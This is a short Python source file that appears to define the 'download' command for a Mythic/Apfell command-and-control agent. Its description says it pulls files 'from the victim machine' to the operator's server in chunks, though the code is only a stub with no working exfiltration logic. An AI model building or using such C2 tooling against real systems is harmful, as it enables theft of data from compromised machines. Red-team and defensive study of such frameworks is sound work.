from CommandBase import *
import json


class DownloadArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            pass
        else:
            raise ValueError("Missing arguments")


class DownloadCommand(CommandBase):
    cmd = "download"
    needs_admin = False
    help_cmd = "download [path to remote file]"
    description = "Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app/files/{operation name}/downloads/{hostname}/{filename}"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = ""
    argument_class = DownloadArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
